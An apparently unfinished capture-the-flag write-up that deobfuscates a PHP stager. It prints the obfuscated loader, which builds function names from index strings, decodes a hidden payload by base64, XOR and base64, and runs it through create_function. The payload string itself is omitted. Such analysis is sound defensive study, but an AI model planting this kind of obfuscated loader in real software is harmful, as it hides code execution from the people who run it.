# PHP Stager
## Ugh, we found PHP set up as an autorun to stage some other weird shady stuff. Can you unravel the payload?

A file is joined to the challenge

---


Let's download the file to begin! 


```php
<?php  


 function deGRi($wyB6B, $w3Q12 = '') { $zZ096 = $wyB6B; $pCLb8 = ''; for ($fMp3G = 0; $fMp3G < strlen($zZ096);) { for ($oxWol = 0; $oxWol < strlen($w3Q12) && $fMp3G < strlen($zZ096); $oxWol++, $fMp3G++) { $pCLb8 .= $zZ096[$fMp3G] ^ $w3Q12[$oxWol]; } } return $pCLb8; }
/*iNsGNGYwlzdJjfaQJIGRtTokpZOTeLzrQnnBdsvXYlQCeCPPBElJTcuHmhkJjFXmRHApOYlqePWotTXHMuiuNfUYCjZsItPbmUiXSxvEEovUceztrezYbaOileiVBabK*/

$lBuAnNeu5282 = ")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";
$gbaylYLd6204 = /* Placeholder for a f*cking very long string I decided to not paste here */
$fsPwhnfn8423 = "";
$oZjuNUpA325 = "";
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $k){
   $fsPwhnfn8423 .= $lBuAnNeu5282[$k];
}
foreach([26,16,14,14,31,33] as $k){
   $oZjuNUpA325 .= $lBuAnNeu5282[$k];
}

/*aajypPZLxFoueiuYpHkwIQbmoSLrNBGmiaDTgcWLKRANAfJxGeoOIzIjLBHHsVEHKTrhqhmFqWgapWrPsuMYcbIZBcXQrjWWEGzoUgWsqUfgyHtbwEDdQxcJKxGTJqIe*/

$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
$c = $k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
$c();

/*TnaqRZZZJMyfalOgUHObXMPnnMIQvrNgBNUkiLwzwxlYWIDfMEsSyVVKkUfFBllcCgiYSrnTCcqLlZMXXuqDsYwbAVUpaZeRXtQGWQwhcAQrUknJCeHiFTpljQdRSGpz*/

        
```


I put your attention to the fact I decided not to paste a `VeryLongString` here for readability. I will put the string at the end of this writeup


## Let's tidy up this code

After modifying variable names and indent a bit this php code I managed to have something readable. 

```php
# deGRi() function looks like a XOR so I renamed it
function xorr($a, $b = '') { 
   
   $c = $a; $d = ''; 
   for ($i = 0; $i < strlen($c);) { 
      for ($j = 0; $j < strlen($b) && $i < strlen($c); $j++, $i++) { 
         $d .= $c[$i] ^ $b[$j]; 
      } 
   } 
   return $d; 
}


$SimpleString=")o4la2cih1kp97rmt*x5dw38b(sfy6;envguz_jq/.0";
$VeryLongString = "/* Placeholder for a f*cking very long string I decided to not paste here */"
$Base64Decode = "";
$ReverseString = "";


#This part here goes into $SimpleString to fetch character and put them in a variable (result=Base64Decode()) So I also renamed the variable
foreach([24,4,26,31,29,2,37,20,31,6,1,20,31] as $position){
   $Base64Decode .= $SimpleString[$position];
}

#This part here goes into $SimpleString to fetch character and put them in a variable (result=strrev()) So I also renamed the variable
foreach([26,16,14,14,31,33] as $position){
   $ReverseString .= $SimpleString[$position];
}


# Here we have $k as CreateFunction()
$k = $ReverseString('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
$c = $k("/*XAjqgQvv4067*/", $Base64Decode( xorr($Base64Decode($VeryLongString), "tVEwfwrN302")));
$c();


```


So this code decodes the `VeryLongString` in this order:

1. Base64
2. XOR with `tVEwfwrN302` as key
3. Another base64

Once decoded we have another very long php code. 

TODO : FINISH 


## VeryLongString